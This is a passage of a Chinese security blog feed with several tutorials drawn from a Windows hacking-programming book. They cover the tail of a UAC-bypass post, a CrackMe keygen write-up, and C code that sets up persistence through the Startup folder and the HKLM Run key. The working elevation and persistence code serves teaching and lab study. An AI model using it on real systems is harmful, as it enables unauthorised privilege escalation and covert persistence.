(BYTE*)<span class="string">&quot;C:\\Users\\b1ackie\\Desktop\\TestApc.exe&quot;</span>, (<span class="built_in">strlen</span>(<span class="string">&quot;C:\\Users\\b1ackie\\Desktop\\TestApc.exe&quot;</span>) + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;CompMgmtLauncher.exe&quot;</span>);</span><br><span class="line">    <span class="built_in">Wow64RevertWow64FsRedirection</span>(OldValue);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要提权的程序为桌面上的TestApc.exe，运行后查看效果。运行程序可以看到，testapc.exe直接运行。</p><p><img src="/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/5.png"></p><p>使用procmon工具查看权限可以看到权限是高</p><p><img src="/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/6.png"></p><p>正常启动查看权限可以看到是中。</p><p><img src="/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/7.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;Bypass-UAC&quot;&gt;&lt;a href=&quot;#Bypass-UAC&quot; class=&quot;headerlink&quot; title=&quot;Bypass UAC&quot;&gt;&lt;/a&gt;Bypass UAC&lt;/h4&gt;&lt;p&gt;UAC（UserAccount Control，用户账户控制）是微软在VIS</summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="恶意代码" scheme="https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="提权技术" scheme="https://b1ack1e.github.io/tags/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF/"/>
    
    <category term="UAC" scheme="https://b1ack1e.github.io/tags/UAC/"/>
    
  </entry>
  
  <entry>
    <title>160CrackMe--002</title>
    <link href="https://b1ack1e.github.io/2021/07/20/160CrackMe-002/"/>
    <id>https://b1ack1e.github.io/2021/07/20/160CrackMe-002/</id>
    <published>2021-07-20T02:17:33.000Z</published>
    <updated>2021-07-20T02:28:03.719Z</updated>
    
    <content type="html"><![CDATA[<h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>打开程序，看到提示输入name和serial，输入后，提示错误。</p><p><img src="/2021/07/20/160CrackMe-002/1.png"></p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>查壳，看到程序没有加壳，是用VB语言写的。</p><p><img src="/2021/07/20/160CrackMe-002/2.png"></p><p>使用OD进行分析，搜索错误提示的字符串，可以直接定位到关键的跳转</p><p><img src="/2021/07/20/160CrackMe-002/3.png"></p><p>开始分析生成serial的过程，首先是获取了name的长度然后将其乘以17CFB再加上name的第一个ASCII码，最后转为十进制字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">00402412   .  50            push eax                                   ; /String = 0000000A ???</span><br><span class="line">00402413   .  8B1A          mov ebx,dword ptr ds:[edx]                 ; |</span><br><span class="line">00402415   .  FF15 E4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenBstr&gt;; \__vbaLenBstr</span><br><span class="line">0040241B   .  8BF8          mov edi,eax                                ;  获取输入的name长度传入edi以便运算</span><br><span class="line">0040241D   .  8B4D E8       mov ecx,dword ptr ss:[ebp-0x18]</span><br><span class="line">00402420   .  69FF FB7C0100 imul edi,edi,0x17CFB                       ;  长度乘0x17CFB</span><br><span class="line">00402426   .  51            push ecx                                   ; /String = 80020004 ???</span><br><span class="line">00402427   .  0F80 91020000 jo Afkayas_.004026BE                       ; |</span><br><span class="line">0040242D   .  FF15 F8404000 call dword ptr ds:[&lt;&amp;MSVBVM50.#516&gt;]       ; \rtcAnsiValueBstr</span><br><span class="line">00402433   .  0FBFD0        movsx edx,ax                               ;  获取输入的第一个ascii传给edx</span><br><span class="line">00402436   .  03FA          add edi,edx                                ;  乘法后的结果加上第一个ascii</span><br><span class="line">00402438   .  0F80 80020000 jo Afkayas_.004026BE</span><br><span class="line">0040243E   .  57            push edi                                   ;  MSVBVM50.__vbaStrCat</span><br><span class="line">0040243F   .  FF15 E0404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrI4&gt;] ;  计算结果转为字符串（十进制）</span><br><span class="line">00402445   .  8BD0          mov edx,eax</span><br><span class="line">00402447   .  8D4D E0       lea ecx,dword ptr ss:[ebp-0x20]</span><br></pre></td></tr></table></figure><p>然后将计算出的结果与“AKA-”进行拼接，再获取serial进行比较。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">00402510   &gt; \8B45 E8       mov eax,dword ptr ss:[ebp-0x18]            ;  输入的Serial</span><br><span class="line">00402513   .  8B4D E4       mov ecx,dword ptr ss:[ebp-0x1C]            ;  计算后的结果</span><br><span class="line">00402516   .  8B3D 00414000 mov edi,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrC&gt;;  MSVBVM50.__vbaStrCat</span><br><span class="line">0040251C   .  50            push eax</span><br><span class="line">0040251D   .  68 701B4000   push Afkayas_.00401B70                     ;  AKA-</span><br><span class="line">00402522   .  51            push ecx                                   ; /String = 80020004 ???</span><br><span class="line">00402523   .  FFD7          call edi                                   ; \将AKA- 与计算后的数值拼接起来</span><br><span class="line">00402525   .  8B1D 70414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrM&gt;;  MSVBVM50.__vbaStrMove</span><br><span class="line">0040252B   .  8BD0          mov edx,eax</span><br><span class="line">0040252D   .  8D4D E0       lea ecx,dword ptr ss:[ebp-0x20]</span><br><span class="line">00402530   .  FFD3          call ebx                                   ;  MSVBVM50.__vbaStrMove; &lt;&amp;MSVBVM50.__vbaStrMove&gt;</span><br><span class="line">00402532   .  50            push eax</span><br><span class="line">00402533   .  FF15 28414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrCmp&gt;&gt;;  比较</span><br></pre></td></tr></table></figure><h4 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h4><p>根据分析的结果进行注册机编写</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;输入name\n&quot;</span>);</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">gets_s(name, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">int</span> length = <span class="built_in">strlen</span>(name);</span><br><span class="line"><span class="keyword">int</span> num = length * <span class="number">0x17CFB</span>;</span><br><span class="line">num += name[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">char</span>* s1 = <span class="string">&quot;AKA-&quot;</span>;</span><br><span class="line"><span class="keyword">char</span>* serial = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(serial, <span class="string">&quot;%s%d&quot;</span>,s1,num);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;用户名是%s\n注册码是%s\n&quot;</span>,name, serial);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行输入name:b1ackie，输出serial:AKA-682815。</p><p><img src="/2021/07/20/160CrackMe-002/4.png"></p><p>输入正确的name和serial后，弹出正确提示</p><p><img src="/2021/07/20/160CrackMe-002/5.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;初探&quot;&gt;&lt;a href=&quot;#初探&quot; class=&quot;headerlink&quot; title=&quot;初探&quot;&gt;&lt;/a&gt;初探&lt;/h4&gt;&lt;p&gt;打开程序，看到提示输入name和serial，输入后，提示错误。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/07/20/160Crack</summary>
      
    
    
    
    <category term="CrackMe" scheme="https://b1ack1e.github.io/categories/CrackMe/"/>
    
    
    <category term="逆向工程" scheme="https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="CrackMe" scheme="https://b1ack1e.github.io/tags/CrackMe/"/>
    
  </entry>
  
  <entry>
    <title>自启动技术-快速启动目录</title>
    <link href="https://b1ack1e.github.io/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95/"/>
    <id>https://b1ack1e.github.io/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95/</id>
    <published>2021-07-19T09:11:43.000Z</published>
    <updated>2021-07-27T08:45:47.743Z</updated>
    
    <content type="html"><![CDATA[<h4 id="快速启动目录"><a href="#快速启动目录" class="headerlink" title="快速启动目录"></a>快速启动目录</h4><p>Windows带有快速启动目录，将需要自启的程序放入其中，就可以实现开机自启。</p><h4 id="函数说明"><a href="#函数说明" class="headerlink" title="函数说明"></a>函数说明</h4><h5 id="SHGetSpecialFolderPath"><a href="#SHGetSpecialFolderPath" class="headerlink" title="SHGetSpecialFolderPath"></a>SHGetSpecialFolderPath</h5><p>获取指定的系统路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BOOL SHGetSpecialFolderPath(</span><br><span class="line">  HWND  hwndOwner,</span><br><span class="line">  LPSTR lpszPath,</span><br><span class="line">  int   nFolder,</span><br><span class="line">  BOOL  fCreate</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hwndOwner：窗口所有者句柄</p><p>lpszPath：返回路径的缓冲区，该缓冲区带下至少为MAX_PATH</p><p>nFolder：系统路径的CSIDL标识。</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>CSIDL_BITBUCKET</td><td>桌面\回收站</td></tr><tr><td>CSIDL_CONTROLS</td><td>我的电脑\控制面板</td></tr><tr><td>CSIDL_DESKTOP</td><td>桌面</td></tr><tr><td>CSIDL_DRIVES</td><td>我的电脑</td></tr><tr><td>CSIDL_STARTUP</td><td>开始菜单\程序\启动</td></tr><tr><td>CSIDL_SYSTEM</td><td>SYSTEM文件夹</td></tr><tr><td>CSIDL_WINDOWS</td><td>WINDOWS目录</td></tr></tbody></table><p>fCreate：指示文件夹不存在时是否要创建。为FALSE时则不创建，否则创建。</p><p>返回值：成功TRUE；失败FALSE。</p><h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><p>获取系统的快速启动目录，然后将需要自启的程序放入快速启动目录中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;shlobj.h&gt;</span></span></span><br><span class="line"><span class="function">BOOL <span class="title">AutoRun</span><span class="params">(<span class="keyword">char</span>* lpszSrcFilePath, <span class="keyword">char</span>* lpszDestFileName)</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> szStartUpPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> szDestFilePath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">//获取快速启动目录</span></span><br><span class="line"><span class="keyword">if</span> (SHGetSpecialFolderPathA(<span class="literal">NULL</span>, szStartUpPath, CSIDL_STARTUP, TRUE) == FALSE) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;获取系统路径失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将数据写入指定的缓冲区</span></span><br><span class="line">wsprintfA(szDestFilePath, <span class="string">&quot;%s\\%s&quot;</span>, szStartUpPath, lpszDestFileName);</span><br><span class="line"><span class="comment">//将文件内容拷贝到缓冲区</span></span><br><span class="line"><span class="keyword">if</span> (CopyFileA(lpszSrcFilePath, szDestFilePath, FALSE) == FALSE) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;向快速启动目录写入失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (AutoRun(<span class="string">&quot;C:\\Users\\b1ackie\\Desktop\\TestApc.exe&quot;</span>, <span class="string">&quot;TestApc.exe&quot;</span>) == FALSE) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;失败\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;成功\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在物理机中运行一下此程序，火绒马上提醒</p><p><img src="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95/1.png"></p><p>在虚拟机中运行此程序，提示成功，然后到快速启动目录中查看，即可看到自启程序</p><p><img src="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95/2.png"></p><p>使用火绒剑进行查看，可以看到在windows的快速启动目录下，有TestApc.exe程序。</p><p><img src="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95/3.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;快速启动目录&quot;&gt;&lt;a href=&quot;#快速启动目录&quot; class=&quot;headerlink&quot; title=&quot;快速启动目录&quot;&gt;&lt;/a&gt;快速启动目录&lt;/h4&gt;&lt;p&gt;Windows带有快速启动目录，将需要自启的程序放入其中，就可以实现开机自启。&lt;/p&gt;
&lt;h4 id=&quot;函数</summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="恶意代码" scheme="https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="自启动技术" scheme="https://b1ack1e.github.io/tags/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>自启动技术-注册表</title>
    <link href="https://b1ack1e.github.io/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/"/>
    <id>https://b1ack1e.github.io/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/</id>
    <published>2021-07-19T06:13:39.000Z</published>
    <updated>2021-07-27T08:46:52.910Z</updated>
    
    <content type="html"><![CDATA[<h4 id="注册表方式实现自启动"><a href="#注册表方式实现自启动" class="headerlink" title="注册表方式实现自启动"></a>注册表方式实现自启动</h4><p>实现开机自启动的方式有很多，其中修改注册表的方式是最为广泛的。</p><h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><h5 id="RegOpenKeyEx"><a href="#RegOpenKeyEx" class="headerlink" title="RegOpenKeyEx"></a>RegOpenKeyEx</h5><p>打开一个指定的注册表键</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LSTATUS RegOpenKeyExA(</span><br><span class="line">  HKEY   hKey,</span><br><span class="line">  LPCSTR lpSubKey,</span><br><span class="line">  DWORD  ulOptions,</span><br><span class="line">  REGSAM samDesired,</span><br><span class="line">  PHKEY  phkResult</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hKey：打开注册表项的句柄。该句柄由RegCreateKeyEx或RegOpenKeyEx函数返回，或者它可以是以下预定义键之一：</p><ul><li>HKEY_CLASSES_ROOT</li><li>HKEY_CURRENT_CONFIG </li><li>HKEY_CURRENT_USER</li><li>HKEY_LOCAL_MACHINE</li><li>HKEY_USERS</li></ul><p>lpSubKey：将打开的注册表子项的名称</p><p>ulOptions：保留，必须设置为0</p><p>samDesired：对指定键希望得到的访问权限进行的访问标记。这个参数可以是下列值得组合</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>KEY_CREATE_LINK</td><td>准许生成符号键</td></tr><tr><td>KET_CREATE_SUB_KEY</td><td>准许生成子键</td></tr><tr><td>KEY_ENUMERATE_SUB_KEYS</td><td>准许生成枚举子键</td></tr><tr><td>KEY_EXECUTE</td><td>准许进行读操作</td></tr><tr><td>KEY_NOTIFY</td><td>准许更换通告</td></tr><tr><td>KEY_QUERY_VALUE</td><td>准许查询子键</td></tr><tr><td>KEY_ALL_ACESS</td><td>提供完全访问，它是上面数值的组合</td></tr><tr><td>KEY_READ</td><td>是KEY_QUERY_VALUE,KEY_ENUMERATE_SUB_KEYS,KEY_NOTIFY的组合</td></tr><tr><td>KEY_SET_VALUE</td><td>准许设置子键的数值</td></tr><tr><td>KEY_WRITE</td><td>是KEY_SET_VALUE、KET_CREATE_SUB_KEY的组合</td></tr><tr><td>KEY_WOW64_32KEY</td><td>表示64位系统中的应用程序应该在32位注册表试图上运行。32位系统会忽略该标志。</td></tr><tr><td>KEY_WOW64_32KEY</td><td>表示64位系统的应用程序应该在64位注册表试图上运行。32位系统上忽略该标志。</td></tr></tbody></table><p>phkResult：指向一个变量的指针，该变量保存打开注册表键的句柄。如果不再使用返回的句柄，则调用RegClose来关闭它。</p><p>返回值：如果成功，返回0；失败返回一个非零的错误代码。</p><h5 id="RegSetValueEx函数"><a href="#RegSetValueEx函数" class="headerlink" title="RegSetValueEx函数"></a>RegSetValueEx函数</h5><p>在注册表项下设置指定值得数据和类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LSTATUS RegSetValueExA(</span><br><span class="line">  HKEY       hKey,</span><br><span class="line">  LPCSTR     lpValueName,</span><br><span class="line">  DWORD      Reserved,</span><br><span class="line">  DWORD      dwType,</span><br><span class="line">  const BYTE *lpData,</span><br><span class="line">  DWORD      cbData</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hKey：指定一个已打开项的句柄，或一个标准项名。</p><p>lpValueName：指向一个字符串的指针，该字符串包含了与设置值的名称。若拥有该名称的值并不存在于指定的注册表中，则此函数会将其加入到该项。如果此值是NULL或指向空字符串，则此函数将会设置该项的默认值或未命名值得类型和数据。</p><p>Reserved：保留值，必须为0；</p><p>dwType：指定将存储的数据类型，该参数可以为以下值之一。</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>REG_BINARY</td><td>任何形式的二进制数据</td></tr><tr><td>REG_DWORD</td><td>一个32位的数字</td></tr><tr><td>REG_DWORD_LITTLE_ENDIAN</td><td>一个格式为“低字节在前”的32位数字</td></tr><tr><td>REG_DWORD_BIG_ENDIAN</td><td>一个格式为“高字节在前”的32位数字</td></tr><tr><td>REG_EXPAND_SZ</td><td>一个以0结尾的字符串，该字符串包含环境变量（如“%PATH”）</td></tr><tr><td>REG_LINK</td><td>一个Unicode格式的带符号链接</td></tr><tr><td>REG_MULTI_SZ</td><td>一个以0结尾的字符串数组，该数组以链接两个0作为终止符</td></tr><tr><td>REG_ONE</td><td>未定义值类型</td></tr><tr><td>REG_RESOURCE_LIST</td><td>一个设备驱动器资源列表</td></tr><tr><td>REG_SZ</td><td>一个以0结尾的字符串</td></tr></tbody></table><p>lpData：指向一个缓冲区，该缓冲区包含了为指定值名称存储的数据。</p><p>cbData：指定由lpData参数所指向的数据大小，单位是字节。</p><p>返回值：返回0表示陈成功；返回其他任何值都代表一个错误代码。</p><h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>对于Windows来说，提供了专门的开机自启动注册表，每次开机时，它都会在这个注册表键下遍历键值，以获取键值中的程序路径，并创建进程启动程序。所以要想实现注册表开机自启动，只需要在这个注册表键下添加想要设置自启动的程序路径就可以了。</p><p>这里用最常见的RUN键来进行设置，该键位置是[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]和[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</p><p>代码实现在HKEY_LOCAL_MACHINE下进行设置，这需要管理员运行权限。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Register</span><span class="params">(<span class="keyword">char</span>* lpszFileName, <span class="keyword">char</span>* lpszValueName)</span> </span>&#123;</span><br><span class="line">    HKEY hKey;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RegOpenKeyEx</span>(HKEY_LOCAL_MACHINE, <span class="string">&quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>, <span class="number">0</span>, KEY_WRITE, &amp;hKey) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;打开注册表失败\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RegSetValueEx</span>(hKey, lpszValueName, <span class="number">0</span>, REG_SZ, (BYTE*)lpszFileName, (<span class="built_in">lstrlen</span>(lpszFileName) + <span class="number">1</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;设置注册表值失败\n&quot;</span>);</span><br><span class="line">        <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Register</span>(<span class="string">&quot;C:\\Users\\b1ackie\\Desktop\\Register.exe&quot;</span>, <span class="string">&quot;b1ackie&quot;</span>) == FALSE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;自启动失败\n&quot;</span>);</span><br><span class="line">        <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;自启动成功\n&quot;</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打开程序，提示自启动成功，说明注册表设置成功。</p><p><img src="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/1.png"></p><p>用regedit命令查看注册表相关信息，可以成功看到当前的注册表信息，注意图中路径的不同，这是因为重定位的原因。</p><p><img src="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/2.png"></p><p>也可以使用火绒剑，如图可以看到启动项的信息，现在重启计算机，就会自动启动了。</p><p><img src="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/3.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;注册表方式实现自启动&quot;&gt;&lt;a href=&quot;#注册表方式实现自启动&quot; class=&quot;headerlink&quot; title=&quot;注册表方式实现自启动&quot;&gt;&lt;/a&gt;注册表方式实现自启动&lt;/h4&gt;&lt;p&gt;实现开机自启动的方式有很多，其中修改注册表的方式是最为广泛的。&lt;/p&gt;
&lt;h</summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
